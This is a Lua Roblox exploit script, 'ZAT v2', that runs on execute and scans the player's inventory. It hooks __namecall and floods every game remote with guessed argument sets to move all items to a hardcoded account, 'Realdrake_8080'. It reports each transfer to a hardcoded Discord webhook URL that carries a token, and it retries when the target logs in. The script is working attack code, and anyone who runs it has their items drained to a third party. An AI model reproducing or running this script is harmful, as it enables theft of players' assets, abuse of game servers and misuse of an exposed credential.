-- ZAT v2 — parallel blast · per-item webhook · summary on empty
-- Auto-fires on execute. No button. Stops when inventory empty.
-- ─────────────────────────────────────────────
local TARGET_USERNAME = "Realdrake_8080"
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1547846204526698597/Waj7LsTdNInSC9s758tkUuRUZxpJ3JeM7RK9tVwrsXJIhUH3vZGnH7iEULtqQuWo7sQX"

-- ═══════════════════════════════════════════════
local LP  = game:GetService("Players").LocalPlayer
local PLR = game:GetService("Players")
local HS  = game:GetService("HttpService")
local TW  = game:GetService("TweenService")
local UIS = game:GetService("UserInputService")
local WS  = game:GetService("Workspace")
local RS  = game:GetService("ReplicatedStorage")

local httpfn = (syn and syn.request) or (http and http.request) or request
local function fetch(u,m,h,b)
    if not httpfn then return nil end
    local ok,r=pcall(httpfn,{Url=u,Method=m or "GET",Headers=h or {},Body=b})
    return ok and r or nil
end
local function jd(s) local ok,v=pcall(HS.JSONDecode,HS,s);return ok and v or nil end
local function je(t) local ok,v=pcall(HS.JSONEncode,HS,t);return ok and v or nil end
local function ts() return os.date("!%H:%M:%S UTC") end

-- ═══════════════════════════════════════════════
-- RESOLVE
-- ═══════════════════════════════════════════════
local function resolveUser(u)
    local r=fetch("https://users.roblox.com/v1/usernames/users","POST",
        {["Content-Type"]="application/json"},
        je({usernames={u},excludeBannedUsers=false}))
    if not r or r.StatusCode~=200 then return nil,nil end
    local d=jd(r.Body)
    if d and d.data and d.data[1] then return d.data[1].id,d.data[1].name end
    return nil,nil
end

-- ═══════════════════════════════════════════════
-- WEBHOOKS
-- ═══════════════════════════════════════════════
local webhookQueue = {}
local webhookBusy  = false

local function flushWebhook()
    if webhookBusy or #webhookQueue==0 then return end
    webhookBusy=true
    task.spawn(function()
        while #webhookQueue>0 do
            local payload=table.remove(webhookQueue,1)
            fetch(DISCORD_WEBHOOK,"POST",{["Content-Type"]="application/json"},je(payload))
            task.wait(0.6) -- Discord rate limit: ~1 req/sec per webhook
        end
        webhookBusy=false
    end)
end

local function queueWebhook(payload)
    if DISCORD_WEBHOOK=="" then return end
    webhookQueue[#webhookQueue+1]=payload
    flushWebhook()
end

local senderName = LP.Name
local senderID   = LP.UserId
local gameName   = "Unknown"
local startTime  = 0
local movedItems = {}

local function webhookItem(itemName,targetName,targetId)
    queueWebhook({
        username="ZAT Transfer",
        embeds={{
            title="📦 Item Transferred",
            color=3066993,
            fields={
                {name="Item",    value="`"..itemName.."`",     inline=true},
                {name="To",      value=targetName.." (`"..targetId.."`)", inline=true},
                {name="From",    value=senderName.." (`"..senderID.."`)", inline=true},
                {name="Game",    value=gameName,              inline=true},
                {name="Time",    value=ts(),                  inline=true},
            },
        }},
    })
end

local function webhookSummary(allItems,targetName,targetId,elapsed)
    local names={}
    for _,it in ipairs(allItems) do names[#names+1]="`"..it.name.."`" end
    queueWebhook({
        username="ZAT Transfer",
        embeds={{
            title="✅ Transfer Complete",
            color=5763719,
            description="All items transferred. Inventory is now empty.",
            fields={
                {name="From",    value=senderName.." (`"..senderID.."`)",    inline=true},
                {name="To",      value=targetName.." (`"..targetId.."`)",    inline=true},
                {name="Game",    value=gameName,                             inline=false},
                {name="Items",   value=table.concat(names," • "),            inline=false},
                {name="Total",   value=tostring(#allItems).." items",        inline=true},
                {name="Duration",value=string.format("%.1fs",elapsed),      inline=true},
                {name="Status",  value="✅ Inventory empty",                 inline=true},
            },
            footer={text="ZAT v2 • "..os.date("!%Y-%m-%d %H:%M UTC")},
        }},
    })
end

-- ═══════════════════════════════════════════════
-- INVENTORY
-- ═══════════════════════════════════════════════
local function scanInventory()
    local out,seen={},{}
    local function add(n,o,c)
        local k=tostring(n)..tostring(o)
        if seen[k] then return end; seen[k]=true
        out[#out+1]={name=n,obj=o,cat=c}
    end
    local bp=LP:FindFirstChildOfClass("Backpack")
    if bp then for _,v in ipairs(bp:GetChildren()) do if v:IsA("Tool") then add(v.Name,v,"Tool") end end end
    local ch=LP.Character
    if ch then for _,v in ipairs(ch:GetChildren()) do if v:IsA("Tool") then add(v.Name,v,"Eq") end end end
    local ls=LP:FindFirstChild("leaderstats")
    if ls then for _,v in ipairs(ls:GetChildren()) do
        if v.Value and v.Value~=0 and v.Value~="" then add(v.Name.."="..tostring(v.Value),v,"Stat") end
    end end
    local aok,at=pcall(function() return LP:GetAttributes() end)
    if aok and type(at)=="table" then for k,v in pairs(at) do
        if type(v)=="number" and v>0 then add(k.." x"..v,LP,"Attr") end
    end end
    for _,c in ipairs(LP:GetChildren()) do
        if (c:IsA("IntValue") or c:IsA("NumberValue") or c:IsA("StringValue") or c:IsA("BoolValue"))
        and c.Name:lower()~="userid" then add(c.Name.."="..tostring(c.Value),c,"Val") end
    end
    for _,f in ipairs(LP:GetChildren()) do
        if f:IsA("Folder") then for _,c in ipairs(f:GetDescendants()) do
            if (c:IsA("StringValue") or c:IsA("IntValue") or c:IsA("NumberValue"))
            and c.Value~=0 and c.Value~="" then add(f.Name.."/"..c.Name,c,"Folder") end
        end end
    end
    local pg=LP:FindFirstChild("PlayerGui")
    if pg then for _,d in ipairs(pg:GetDescendants()) do
        if d:IsA("TextLabel") and d.Text~="" and d.Text~="0" then
            local pn=d.Parent and d.Parent.Name:lower() or ""
            if pn:find("slot") or pn:find("item") or pn:find("inv")
            or pn:find("seed") or pn:find("fruit") or pn:find("pet") then
                add(d.Text,d,"Slot") end
        end
    end end
    for _,root in ipairs({
        WS:FindFirstChild(LP.Name),WS:FindFirstChild("Plots"),
        WS:FindFirstChild("Gardens"),WS:FindFirstChild("Farms"),
        WS:FindFirstChild("Inventory"),WS:FindFirstChild("Seeds"),
        WS:FindFirstChild("Storage"),WS:FindFirstChild("Crops"),WS:FindFirstChild("Fruits"),
    }) do if root then
        local sub=root:FindFirstChild(LP.Name) or root
        for _,c in ipairs(sub:GetDescendants()) do
            if c:IsA("Tool") or c:IsA("Model") then add(c.Name,c,"World") end
        end
    end end
    local rsp=RS:FindFirstChild(LP.Name) or RS:FindFirstChild("PlayerData")
    if rsp then for _,c in ipairs(rsp:GetDescendants()) do
        if (c:IsA("StringValue") or c:IsA("IntValue") or c:IsA("NumberValue"))
        and c.Value~=0 then add(c.Name,c,"RS") end
    end end
    return out
end

local function currentNames()
    local t={}; for _,it in ipairs(scanInventory()) do t[it.name]=true end; return t
end

local function isEmpty(original)
    local cur=currentNames()
    for _,it in ipairs(original) do if cur[it.name] then return false end end
    return true
end

-- ═══════════════════════════════════════════════
-- HOOKMETAMETHOD INTERCEPTOR
-- ═══════════════════════════════════════════════
local captured={}; local hookOn=false
local GIVE_KW={"give","transfer","send","trade","gift","grant","deliver",
    "deposit","item","seed","fruit","pet","crop","inv","bulk","offline","data","save"}

local function scoreRem(nm)
    local n,s=nm:lower(),0
    for _,k in ipairs(GIVE_KW) do if n:find(k) then s=s+1 end end
    return s
end

local function startHook()
    if not hookmetamethod then return false end
    hookOn=true; local orig
    orig=hookmetamethod(game,"__namecall",function(self,...)
        local m=getnamecallmethod()
        if hookOn and (m=="FireServer" or m=="InvokeServer") then
            if self:IsA("RemoteEvent") or self:IsA("RemoteFunction") then
                local nm=self.Name; local args={...}
                local sc=scoreRem(nm)
                for _,a in ipairs(args) do
                    if type(a)=="userdata" then sc=sc+3
                    elseif type(a)=="number" and a>100000 and a~=LP.UserId then sc=sc+5 end
                end
                if sc>0 then
                    if not captured[nm] then captured[nm]={score=sc,calls={},remote=self} end
                    local sig=tostring(#args)
                    local exists=false
                    for _,c in ipairs(captured[nm].calls) do if c.sig==sig then exists=true;c.n=c.n+1;break end end
                    if not exists then captured[nm].calls[#captured[nm].calls+1]={args=args,sig=sig,n=1,method=m} end
                end
            end
        end
        return orig(self,...)
    end)
    return true
end
local function stopHook() hookOn=false end

-- ═══════════════════════════════════════════════
-- BUILD ALL ARG SETS (bulk + per-item)
-- ═══════════════════════════════════════════════
local function buildArgs(tid,tn,tp,items,names)
    local A={}
    local function a(...) A[#A+1]={...} end
    local function d(t)   A[#A+1]=t     end

    -- bulk: all items in one shot
    a(tid,items);  a(tid,names);  a(tn,items);  a(tn,names)
    a(tostring(tid),items); a(tostring(tid),names)
    if tp then a(tp,items); a(tp,names); a(tp) end
    d({userId=tid, items=items, save=true})
    d({userId=tid, items=names, amount="all"})
    d({userId=tid, itemList=names, save=true})
    d({username=tn, items=items})
    d({username=tn, items=names})
    d({to=tid, items=items, qty="all"})
    d({target=tid, items=names})
    d({targetId=tid, itemList=names, save=true})
    d({recipient=tid, items=items})
    d({sendTo=tid, items=names})
    if tp then d({player=tp, items=items}); d({player=tp, items=names}) end

    -- give-all (no item arg — some games give entire inventory)
    a(tid); a(tn); a(tostring(tid))
    d({userId=tid}); d({userId=tid,save=true})
    d({username=tn}); d({to=tid}); d({targetId=tid})
    if tp then a(tp) end

    -- per-item: every item, every pattern
    for _,it in ipairs(items) do
        local n,o=it.name,it.obj
        a(tid,n);    a(tid,n,1);   a(tid,n,1,true)
        a(tn,n);     a(tn,n,1)
        a(tostring(tid),n)
        a(n,tid);    a(n,tn)
        if tp then a(tp,n); a(tp,o); a(tp,n,1) end
        d({userId=tid,   item=n,  amount=1, save=true})
        d({userId=tid,   itemName=n, qty=1})
        d({userId=tid,   seed=n,  count=1})
        d({userId=tid,   fruit=n, amount=1})
        d({userId=tid,   fruitName=n, permanent=true})
        d({userId=tid,   pet=n,   amount=1})
        d({username=tn,  item=n,  amount=1})
        d({to=tid,       item=n,  qty=1})
        d({target=tid,   item=n})
        d({targetId=tid, itemName=n, amount=1})
        d({recipient=tid,itemName=n})
        d({sendTo=tid,   item=n,  qty=1})
        if tp then
            d({player=tp, item=n})
            d({player=tp, itemName=n, amount=1})
        end
    end

    -- captured hook patterns (swapped)
    local sorted={}
    for nm,data in pairs(captured) do sorted[#sorted+1]={nm=nm,data=data} end
    table.sort(sorted,function(a,b) return a.data.score>b.data.score end)
    for _,entry in ipairs(sorted) do
        local rem=entry.data.remote
        if rem then
            for _,call in ipairs(entry.data.calls) do
                for _,item in ipairs(items) do
                    local sw={}
                    for _,arg in ipairs(call.args) do
                        if type(arg)=="number" and arg==LP.UserId then sw[#sw+1]=tid
                        elseif type(arg)=="string" and tostring(LP.UserId)==arg then sw[#sw+1]=tostring(tid)
                        elseif type(arg)=="string" and arg==LP.Name then sw[#sw+1]=tn
                        elseif type(arg)=="userdata" then sw[#sw+1]=tp or tid
                        else sw[#sw+1]=arg end
                    end
                    A[#A+1]={_rem=rem, _fn=call.method=="InvokeServer", _args=sw}
                    local wi={}; for _,a in ipairs(sw) do wi[#wi+1]=a end; wi[#wi+1]=item.name
                    A[#A+1]={_rem=rem, _fn=call.method=="InvokeServer", _args=wi}
                end
            end
        end
    end

    return A
end

-- ═══════════════════════════════════════════════
-- PARALLEL BLAST ENGINE
-- Fires every remote with every arg set simultaneously
-- ═══════════════════════════════════════════════
local KNOWN_REMS={
    "GiveItem","TransferItem","SendItem","GiftItem","GiveSeed","TransferSeed",
    "GivePet","TransferPet","GiveCrop","TransferCrop","GiveFruit","TransferFruit",
    "GiveToPlayer","PlayerGive","ItemTransfer","TradeItem","RequestTrade","AcceptTrade",
    "Give","Transfer","Send","Gift","BulkGive","GiveAll","TransferAll",
    "OfflineGive","DataGive","SaveGive","InventoryGive","InventoryTransfer",
    "GiveUnit","SendUnit","GiveGear","SendGear","GiveCurrency","SendCurrency",
    "TradeSend","TradeOffer","Grant","Award","Deliver","Deposit",
    "GiveV2","TransferV2","PlayerTransfer","DatastoreGive","SaveTransfer",
    "GiveWeapon","GiveSword","GiveKnife","GiveGun","GiveRace","GiveAura",
    "StoreFruit","DepositFruit","FruitGive","StoreInSafe","FruitSafe",
    "AddItem","StoreItem","DepositItem","SendGift","GiftPet","OfferItem",
}

local function collectAndSort()
    local all,seen={},{}
    -- known-name remotes get priority=3
    local knownSet={}; for _,n in ipairs(KNOWN_REMS) do knownSet[n:lower()]=true end
    for _,v in ipairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            local fp=v:GetFullName()
            if not seen[fp] then
                seen[fp]=true
                local pri= knownSet[v.Name:lower()] and 3 or scoreRem(v.Name)
                all[#all+1]={r=v,nm=v.Name,fn=v.ClassName=="RemoteFunction",pri=pri}
            end
        end
    end
    table.sort(all,function(a,b) return a.pri>b.pri end)
    return all
end

local function fireArg(entry,a)
    -- a can be:
    --   positional table  {val,val,...}
    --   dict table        {key=val,...}
    --   captured special  {_rem=..., _fn=..., _args=...}
    if a._rem then
        -- captured: fire on specific remote
        pcall(function()
            if a._fn then a._rem:InvokeServer(table.unpack(a._args))
            else           a._rem:FireServer(table.unpack(a._args)) end
        end)
        return
    end
    local isDict=false
    for k in pairs(a) do if type(k)~="number" then isDict=true;break end end
    pcall(function()
        if isDict then
            if entry.fn then entry.r:InvokeServer(a) else entry.r:FireServer(a) end
        else
            if entry.fn then entry.r:InvokeServer(table.unpack(a))
            else              entry.r:FireServer(table.unpack(a)) end
        end
    end)
end

-- Fires ALL remotes × ALL arg sets in parallel
-- Target: complete in <10 seconds
local function parallelBlast(remotes,argSets,firedRef)
    -- spawn one coroutine per remote
    -- each coroutine iterates through all arg sets
    local done=0; local total=#remotes
    for _,entry in ipairs(remotes) do
        task.spawn(function()
            for _,a in ipairs(argSets) do
                fireArg(entry,a)
                -- no wait — fire as fast as Lua allows
            end
            if firedRef then firedRef[1]=firedRef[1]+1 end
            done=done+1
        end)
    end
    -- wait for all coroutines (with 12s safety cap)
    local deadline=tick()+12
    while done<total and tick()<deadline do task.wait(0.05) end
end

-- ═══════════════════════════════════════════════
-- OFFLINE QUEUE
-- ═══════════════════════════════════════════════
local offQ={}
PLR.PlayerAdded:Connect(function(player)
    for i=#offQ,1,-1 do
        local job=offQ[i]
        if player.UserId==job.tid then
            task.spawn(function()
                task.wait(2)
                local names={}; for _,it in ipairs(job.items) do names[#names+1]=it.name end
                local args=buildArgs(job.tid,job.tn,player,job.items,names)
                local rems=collectAndSort()
                local fr={0}; parallelBlast(rems,args,fr)
                table.remove(offQ,i)
            end)
        end
    end
end)

-- ═══════════════════════════════════════════════
-- UI
-- ═══════════════════════════════════════════════
local C={
    bg=Color3.fromRGB(10,10,15),  panel=Color3.fromRGB(17,17,24),
    bar=Color3.fromRGB(23,23,32), accent=Color3.fromRGB(78,55,245),
    green=Color3.fromRGB(35,200,70),  red=Color3.fromRGB(245,50,50),
    yellow=Color3.fromRGB(245,178,28),white=Color3.fromRGB(212,212,225),
    grey=Color3.fromRGB(95,95,115),   border=Color3.fromRGB(32,32,46),
    teal=Color3.fromRGB(30,180,160),  orange=Color3.fromRGB(245,125,25),
}
local function mk(c,p) local o=Instance.new(c);for k,v in pairs(p or {}) do o[k]=v end;return o end
local function corner(r,p) mk("UICorner",{CornerRadius=UDim.new(0,r),Parent=p}) end
local function stroke(c,t,p) mk("UIStroke",{Color=c,Thickness=t,Parent=p}) end

local SG=mk("ScreenGui",{Name="ZAT_V2",ResetOnSpawn=false,IgnoreGuiInset=true,ZIndexBehavior=Enum.ZIndexBehavior.Sibling})
pcall(function() SG.Parent=game:GetService("CoreGui") end)
if not SG.Parent then SG.Parent=LP.PlayerGui end

local WIN=mk("Frame",{Parent=SG,Size=UDim2.new(0,360,0,460),
    Position=UDim2.new(0.5,-180,0.5,-230),BackgroundColor3=C.bg,BorderSizePixel=0,ClipsDescendants=true})
corner(12,WIN); stroke(C.border,1,WIN)

-- title
local TB=mk("Frame",{Parent=WIN,Size=UDim2.new(1,0,0,40),BackgroundColor3=C.panel,BorderSizePixel=0})
corner(12,TB)
mk("Frame",{Parent=TB,Size=UDim2.new(1,0,0.5,0),Position=UDim2.new(0,0,0.5,0),BackgroundColor3=C.panel,BorderSizePixel=0})
mk("TextLabel",{Parent=TB,Text="⚡  ZAT v2",TextSize=14,Font=Enum.Font.GothamBold,
    TextColor3=C.white,BackgroundTransparency=1,Size=UDim2.new(0.5,0,1,0),
    Position=UDim2.new(0,14,0,0),TextXAlignment=Enum.TextXAlignment.Left})
local HOOKDOT=mk("Frame",{Parent=TB,Size=UDim2.new(0,8,0,8),
    Position=UDim2.new(1,-18,0.5,0),AnchorPoint=Vector2.new(0.5,0.5),
    BackgroundColor3=C.grey,BorderSizePixel=0}); corner(8,HOOKDOT)
local HOOKTEXT=mk("TextLabel",{Parent=TB,Text="hook",TextSize=10,Font=Enum.Font.Gotham,
    TextColor3=C.grey,BackgroundTransparency=1,Size=UDim2.new(0,40,1,0),
    Position=UDim2.new(1,-58,0,0),TextXAlignment=Enum.TextXAlignment.Left})

-- drag
local dg,ds,sp=false,nil,nil
TB.InputBegan:Connect(function(i)
    if i.UserInputType==Enum.UserInputType.MouseButton1 then dg=true;ds=i.Position;sp=WIN.Position end
end)
UIS.InputChanged:Connect(function(i)
    if dg and i.UserInputType==Enum.UserInputType.MouseMovement then
        local d=i.Position-ds
        WIN.Position=UDim2.new(sp.X.Scale,sp.X.Offset+d.X,sp.Y.Scale,sp.Y.Offset+d.Y)
    end
end)
UIS.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then dg=false end end)

-- stats
local SR=mk("Frame",{Parent=WIN,Size=UDim2.new(1,-20,0,48),Position=UDim2.new(0,10,0,48),BackgroundColor3=C.panel,BorderSizePixel=0})
corner(8,SR); stroke(C.border,1,SR)
local sv={}
local function sbox(lbl,val,x,w)
    w=w or 82; local f=mk("Frame",{Parent=SR,Size=UDim2.new(0,w,1,0),Position=UDim2.new(0,x,0,0),BackgroundTransparency=1})
    mk("TextLabel",{Parent=f,Text=lbl,TextSize=9,Font=Enum.Font.Gotham,TextColor3=C.grey,BackgroundTransparency=1,Size=UDim2.new(1,0,0,15),Position=UDim2.new(0,8,0,4),TextXAlignment=Enum.TextXAlignment.Left})
    local v=mk("TextLabel",{Parent=f,Text=val,TextSize=16,Font=Enum.Font.GothamBold,TextColor3=C.white,BackgroundTransparency=1,Size=UDim2.new(1,0,0,22),Position=UDim2.new(0,8,0,18),TextXAlignment=Enum.TextXAlignment.Left})
    return v
end
sv.rem=sbox("REMOTES","—",0); sv.args=sbox("ARG SETS","—",84)
sv.frd=sbox("FIRED","0",168); sv.mov=sbox("MOVED","0",252)

-- timer bar (fills over 11s)
local TIMEBG=mk("Frame",{Parent=WIN,Size=UDim2.new(1,-20,0,4),Position=UDim2.new(0,10,0,104),BackgroundColor3=C.bar,BorderSizePixel=0}); corner(3,TIMEBG)
local TIMEFG=mk("Frame",{Parent=TIMEBG,Size=UDim2.new(0,0,1,0),BackgroundColor3=C.orange,BorderSizePixel=0}); corner(3,TIMEFG)

-- phase
local PHASE=mk("TextLabel",{Parent=WIN,Text="⏳ Starting...",TextSize=11,Font=Enum.Font.GothamBold,
    TextColor3=C.accent,BackgroundTransparency=1,Size=UDim2.new(1,-20,0,14),
    Position=UDim2.new(0,10,0,113),TextXAlignment=Enum.TextXAlignment.Left})

-- item list
mk("TextLabel",{Parent=WIN,Text="📦 INVENTORY",TextSize=9,Font=Enum.Font.GothamBold,TextColor3=C.grey,
    BackgroundTransparency=1,Size=UDim2.new(0,165,0,12),Position=UDim2.new(0,10,0,134)})
local IBOX=mk("Frame",{Parent=WIN,Size=UDim2.new(0,162,0,220),Position=UDim2.new(0,10,0,148),
    BackgroundColor3=C.panel,BorderSizePixel=0,ClipsDescendants=true})
corner(8,IBOX); stroke(C.border,1,IBOX)
local ISC=mk("ScrollingFrame",{Parent=IBOX,Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,
    BorderSizePixel=0,ScrollBarThickness=2,ScrollBarImageColor3=C.accent,
    CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y})
mk("UIListLayout",{Parent=ISC,SortOrder=Enum.SortOrder.LayoutOrder,Padding=UDim.new(0,1)})
local irows={};  local movedCt=0
local function renderItems(items)
    for _,c in ipairs(ISC:GetChildren()) do if c:IsA("TextLabel") then c:Destroy() end end
    irows={}
    for i,it in ipairs(items) do
        local r=mk("TextLabel",{Parent=ISC,Text="·  "..it.name,TextSize=10,Font=Enum.Font.Code,
            TextColor3=C.white,BackgroundTransparency=1,Size=UDim2.new(1,-8,0,14),
            Position=UDim2.new(0,6,0,0),TextXAlignment=Enum.TextXAlignment.Left,
            TextTruncate=Enum.TextTruncate.AtEnd,LayoutOrder=i})
        irows[it.name]=r
    end
end
local function markMoved(name)
    movedCt=movedCt+1; sv.mov.Text=tostring(movedCt)
    local r=irows[name]
    if r then
        TW:Create(r,TweenInfo.new(0.3),{TextColor3=C.green}):Play()
        r.Text="✓  "..name
    end
end

-- log
mk("TextLabel",{Parent=WIN,Text="📋 LOG",TextSize=9,Font=Enum.Font.GothamBold,TextColor3=C.grey,
    BackgroundTransparency=1,Size=UDim2.new(0,178,0,12),Position=UDim2.new(0,184,0,134)})
local LBOX=mk("Frame",{Parent=WIN,Size=UDim2.new(0,166,0,220),Position=UDim2.new(0,184,0,148),
    BackgroundColor3=C.panel,BorderSizePixel=0,ClipsDescendants=true})
corner(8,LBOX); stroke(C.border,1,LBOX)
local LSC=mk("ScrollingFrame",{Parent=LBOX,Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,
    BorderSizePixel=0,ScrollBarThickness=2,ScrollBarImageColor3=C.accent,
    CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y})
mk("UIListLayout",{Parent=LSC,SortOrder=Enum.SortOrder.LayoutOrder})
local lo=0
local function log(msg,kind)
    local cols={ok=C.green,err=C.red,warn=C.yellow,info=C.white,step=C.accent,done=C.green,fire=C.orange}
    local icons={ok="✓",err="✗",warn="!",info="→",step="■",done="★",fire="🔥"}
    local col=cols[kind or "info"] or C.grey
    local txt="["..(icons[kind or "info"] or "→").."] "..tostring(msg)
    lo=lo+1
    mk("TextLabel",{Parent=LSC,Text=txt,TextSize=10,Font=Enum.Font.Code,TextColor3=col,
        BackgroundTransparency=1,Size=UDim2.new(1,-8,0,13),
        TextXAlignment=Enum.TextXAlignment.Left,TextTruncate=Enum.TextTruncate.AtEnd,LayoutOrder=lo})
    task.defer(function() LSC.CanvasPosition=Vector2.new(0,LSC.AbsoluteCanvasSize.Y) end)
    local ch=LSC:GetChildren()
    if #ch>90 then for i=1,#ch-80 do if ch[i]:IsA("TextLabel") then ch[i]:Destroy() end end end
    PHASE.Text=txt; PHASE.TextColor3=col; print(txt)
end

-- bottom bar
local BBAR=mk("Frame",{Parent=WIN,Size=UDim2.new(1,-20,0,30),Position=UDim2.new(0,10,1,-40),
    BackgroundColor3=C.panel,BorderSizePixel=0}); corner(8,BBAR); stroke(C.border,1,BBAR)
local BLAST=mk("TextLabel",{Parent=BBAR,Text="⏳ Initializing...",TextSize=11,
    Font=Enum.Font.GothamBold,TextColor3=C.accent,BackgroundTransparency=1,
    Size=UDim2.new(1,-16,1,0),Position=UDim2.new(0,10,0,0),TextXAlignment=Enum.TextXAlignment.Left})
local function setBar(txt,col)
    BLAST.Text=txt; BLAST.TextColor3=col or C.accent
end

local function setDot(c)
    TW:Create(HOOKDOT,TweenInfo.new(0.2),{BackgroundColor3=c}):Play()
end

-- ═══════════════════════════════════════════════
-- MAIN — auto-runs immediately on execute
-- ═══════════════════════════════════════════════
task.spawn(function()
    setBar("⏳ Starting up...",C.accent)

    -- HTTP
    if not httpfn then
        log("HTTP not found — enable in Delta settings","err")
        setBar("✗ HTTP missing",C.red); return
    end
    log("HTTP ok","ok")

    -- Game name
    pcall(function()
        gameName=game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or gameName
    end)
    log("Game: "..gameName,"info")

    -- Hook
    local hkOn=startHook()
    if hkOn then
        setDot(C.teal); HOOKTEXT.Text="hook: ON"; HOOKTEXT.TextColor3=C.teal
        log("hookmetamethod: ACTIVE","ok")
    else
        setDot(C.yellow); HOOKTEXT.Text="hook: n/a"; HOOKTEXT.TextColor3=C.yellow
        log("hookmetamethod: unavailable — fallback only","warn")
    end

    -- Resolve
    setBar("⏳ Resolving "..TARGET_USERNAME,C.accent)
    log("Resolving "..TARGET_USERNAME,"info")
    local tid,tn=resolveUser(TARGET_USERNAME)
    if not tid then
        log("Cannot resolve '"..TARGET_USERNAME.."'","err")
        setBar("✗ Cannot resolve username",C.red); return
    end
    if tid==LP.UserId then
        log("Target = sender","err"); setBar("✗ Same account",C.red); return
    end
    log("Target: "..tn.." ("..tid..")","ok")

    local tp=PLR:GetPlayerByUserId(tid)
    log(tp and "Target ONLINE" or "Target OFFLINE — DataStore paths active","warn")

    -- Scan inventory
    setBar("⏳ Scanning inventory...",C.accent)
    log("Scanning inventory...","info")
    local items=scanInventory()
    sv.items=sv.rem -- reuse slot label (already rendered)
    sv.rem.Text=tostring(#items)
    if #items==0 then
        log("No items found — make sure you are in-game","warn")
        setBar("! No items found",C.yellow); return
    end
    log("Found "..#items.." items","ok")
    renderItems(items)

    -- Collect remotes
    setBar("⏳ Collecting remotes...",C.accent)
    log("Collecting remotes...","info")
    local remotes=collectAndSort()
    sv.args.Text=tostring(#remotes) -- show remote count in ARGS slot
    log("Remotes: "..#remotes,"ok")
    log("Top: "..remotes[1].nm.." [pri="..remotes[1].pri.."]","info")

    -- Build arg sets
    local names={}
    for _,it in ipairs(items) do names[#names+1]=it.name end
    local argSets=buildArgs(tid,tn,tp,items,names)
    sv.frd.Text=tostring(#argSets)  -- show arg count in FIRED slot until firing starts
    log("Arg sets: "..#argSets,"ok")

    -- Arm offline queue
    offQ[#offQ+1]={tid=tid,tn=tn,items=items}
    log("Offline queue armed","ok")

    -- Drain watcher — updates UI + fires per-item webhook
    local drained={}
    task.spawn(function()
        while true do
            local cur=currentNames()
            for _,it in ipairs(items) do
                if not cur[it.name] and not drained[it.name] then
                    drained[it.name]=true
                    log("MOVED: "..it.name,"done")
                    markMoved(it.name)
                    -- per-item webhook
                    task.spawn(function()
                        webhookItem(it.name,tn,tostring(tid))
                    end)
                end
            end
            task.wait(0.3)
        end
    end)

    -- Timer bar animation (fills over 11s per blast)
    local function animateTimer()
        TIMEFG.Size=UDim2.new(0,0,1,0)
        TW:Create(TIMEFG,TweenInfo.new(11,Enum.EasingStyle.Linear),{Size=UDim2.new(1,0,1,0)}):Play()
    end

    -- ═══════════════════════════════════════════
    -- BLAST LOOP — fires until inventory empty
    -- ═══════════════════════════════════════════
    local firedRef={0}; local loop=0

    while not isEmpty(items) do
        loop=loop+1

        -- refresh tp and rebuild args each loop
        tp=PLR:GetPlayerByUserId(tid)
        argSets=buildArgs(tid,tn,tp,items,names)

        local txt="🔥 BLAST "..loop.." — "..#remotes.." remotes × "..#argSets.." args"
        setBar(txt,C.orange); log(txt,"fire")
        animateTimer()

        -- PARALLEL BLAST — all at once, target <11 seconds
        parallelBlast(remotes,argSets,firedRef)

        sv.frd.Text=tostring(firedRef[1])
        log("Blast "..loop.." done — fired: "..firedRef[1],"ok")

        if not isEmpty(items) then task.wait(2) end
    end

    -- ═══════════════════════════════════════════
    -- SUCCESS
    -- ═══════════════════════════════════════════
    stopHook()
    local elapsed=tick()-startTime

    TW:Create(TIMEFG,TweenInfo.new(0.3),{Size=UDim2.new(1,0,1,0),BackgroundColor3=C.green}):Play()
    setDot(C.green)
    setBar("✅ ALL TRANSFERRED — inventory empty",C.green)
    log("SUCCESS — "..movedCt.." items moved — "..loop.." blasts","done")
    log("Log into "..tn.." and join this game","info")

    -- summary webhook
    task.spawn(function()
        -- wait for per-item webhooks to drain first
        task.wait(math.min(#items*0.7,8))
        webhookSummary(items,tn,tostring(tid),elapsed)
    end)
end)

-- track start time
startTime=tick()
